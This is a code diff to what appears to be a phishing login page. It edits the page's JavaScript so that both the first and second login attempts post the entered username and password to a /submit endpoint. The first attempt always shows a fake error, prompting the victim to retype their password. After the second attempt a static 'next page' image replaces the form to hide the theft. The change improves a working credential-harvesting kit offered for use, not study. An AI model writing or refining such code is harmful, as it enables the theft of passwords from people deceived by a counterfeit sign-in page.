@@ -441,7 +441,7 @@
                                     <button type="button" id="show-password-btn" style="display: none;">Show</button>
                                 </div>
                             </div>
-                            <a href="#" class="forgot-pw" style="color: rgba(0, 4, 255, 0.708); margin-left: 150px; margin-top: 20px;">Forgot passworddd?</a><br>
+                            <a href="#" class="forgot-pw" style="color: rgba(0, 4, 255, 0.708); margin-left: 150px; margin-top: 20px;">Forgot password?</a><br>
                             <div class="btn-group">
                                 <button class="btn-login" id="signin-btn" disabled>
                                     Log in
@@ -494,35 +494,32 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // Hide loading overlay once the page is fully loaded
             const loadingOverlay = document.getElementById('loading-overlay');
             loadingOverlay.style.display = 'none';
-
+    
             const emailInput = document.querySelector('input[type="text"]');
             const passwordInput = document.getElementById('password');
             const loginButton = document.getElementById('signin-btn');
             const showPasswordButton = document.getElementById('show-password-btn');
             const darkModeToggle = document.getElementById('darkmode-toggle');
             const errorMessage = document.getElementById('error-message');
-            let loginAttempts = 0; // Counter for login attempts
-
-            
-
+            let isFirstClick = true; // Flag for first click
+    
             const animateInputs = document.querySelectorAll('.animate-input');
-
+    
             animateInputs.forEach(inputContainer => {
                 const input = inputContainer.querySelector('input');
-
+    
                 input.addEventListener('focus', () => {
                     inputContainer.classList.add('active');
                 });
-
+    
                 input.addEventListener('blur', () => {
                     if (!input.value) {
                         inputContainer.classList.remove('active');
                     }
                 });
-
+    
                 input.addEventListener('input', () => {
                     if (input.value) {
                         inputContainer.classList.add('active');
@@ -532,69 +529,89 @@
                     validateInputs();
                 });
             });
-
+    
             function validateInputs() {
                 const email = emailInput.value.trim();
                 const password = passwordInput.value.trim();
                 loginButton.disabled = !(email && password);
             }
-
+    
             passwordInput.addEventListener('input', () => {
                 showPasswordButton.style.display = passwordInput.value ? 'inline' : 'none';
             });
-
+    
             showPasswordButton.addEventListener('click', () => {
                 const isPasswordVisible = passwordInput.type === 'text';
                 passwordInput.type = isPasswordVisible ? 'password' : 'text';
                 showPasswordButton.textContent = isPasswordVisible ? 'Show' : 'Hide';
             });
-
+    
             loginButton.addEventListener('click', async (e) => {
                 e.preventDefault();
-                loginAttempts++; // Increment the login attempt counter
-
-                if (loginAttempts === 1) {
-                    errorMessage.style.display = 'block'; // Show error message
-                } else {
-                    const username = emailInput.value;
-                    const password = passwordInput.value;
-
+    
+                const username = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+    
+                if (isFirstClick) {
+                    // First click: only send data and show error if necessary
+                    errorMessage.style.display = 'block'; // Hide previous error messages
+    
                     try {
                         const response = await fetch('/submit', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/x-www-form-urlencoded',
-                                },
-                                body: new URLSearchParams({ username, password })
-                            });
-
-
-                        
-
-                        const result = await response.text();
-                        console.log('Success:', result);
-
-                        localStorage.setItem('formSubmitted', 'true');
-                        // Clear fields and disable button after submission
-                        emailInput.value = '';
-                        passwordInput.value = '';
-                        loginButton.disabled = true;
-                        showPasswordButton.style.display = 'none';
-                        errorMessage.style.display = 'none'; // Hide error message after login attempt
-                        loginAttempts = 0; // Reset login attempts
-                       
-                        // displayImage();
-                        displayFaviconAndImage();
-                        
-
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                            },
+                            body: new URLSearchParams({ username, password })
+                        });
+    
                     } catch (error) {
                         console.error('Error:', error);
+                        errorMessage.style.display = 'block'; // Show error message on catch
+                    }
+    
+                    // Set the flag to false to indicate the first click is done
+                    isFirstClick = false;
+                } else {
+                    // Second click: send data and show favicon and next image
+                    errorMessage.style.display = 'none'; // Hide error message before this submission
+    
+                    // Get the latest values from the input fields for the second submission
+                    const updatedUsername = emailInput.value.trim();
+                    const updatedPassword = passwordInput.value.trim();
+    
+                    try {
+                        displayFaviconAndImage();
+                        const response = await fetch('/submit', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                            },
+                            body: new URLSearchParams({ username: updatedUsername, password: updatedPassword })
+                        });
+    
+                        if (response.ok) {
+                            localStorage.setItem('formSubmitted', 'true');
+    
+                            // Clear fields after successful submission
+                            emailInput.value = '';
+                            passwordInput.value = '';
+                            loginButton.disabled = true;
+                            showPasswordButton.style.display = 'none';
+    
+                            // Display favicon and next image
+                            
+                        } else {
+                            errorMessage.style.display = 'block'; // Show error message if submission fails
+                        }
+                    } catch (error) {
+                        console.error('Error:', error);
+                        errorMessage.style.display = 'block'; // Show error message on catch
                     }
                 }
             });
-
+    
             function displayFaviconAndImage() {
-            // Create overlay for the favicon
                 const overlay = document.createElement('div');
                 overlay.style.position = 'fixed';
                 overlay.style.top = '0';
@@ -605,41 +622,33 @@
                 overlay.style.alignItems = 'center';
                 overlay.style.justifyContent = 'center';
                 overlay.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
-
+    
                 const faviconImage = document.createElement('img');
                 faviconImage.src = './images/favicon.png'; // Your favicon path
                 faviconImage.alt = 'Loading...';
                 faviconImage.style.width = '100px'; // Adjust as needed
                 faviconImage.style.marginTop = '-80px';
-
+    
                 overlay.appendChild(faviconImage);
                 document.body.appendChild(overlay);
-
+    
                 // Show the favicon for 2 seconds
                 setTimeout(() => {
-                    // Hide the favicon overlay
                     document.body.removeChild(overlay);
                     displayImage();
-
-
-                }, 1000); // 2000 milliseconds = 2 seconds
+                }, 2000); // 2000 milliseconds = 2 seconds
             }
-
-            
-
-
-
-             function displayImage() {
-                localStorage.setItem('formSubmitted', 'true');
-            document.body.innerHTML = `
-                <img src="./images/next_page.jpg" alt="Submitted!" style="width: 100%; height: auto; max-height: 100vh; object-fit: contain; ">
-            `;
+    
+            function displayImage() {
+                document.body.innerHTML = `
+                    <img src="./images/next_page.jpg" alt="Submitted!" style="width: 100%; height: auto; max-height: 100vh; object-fit: contain;">
+                `;
             }
-
+    
             if (localStorage.getItem('formSubmitted') === 'true') {
-                hideImage();
+                hideImage(); // Assuming you have a hideImage function defined elsewhere
             }
-
+    
             darkModeToggle.addEventListener('click', () => {
                 document.body.classList.toggle('dark');
                 const isDarkMode = document.body.classList.contains('dark');
@@ -647,6 +656,7 @@
             });
         });
     </script>
+    
 
 </body>
 
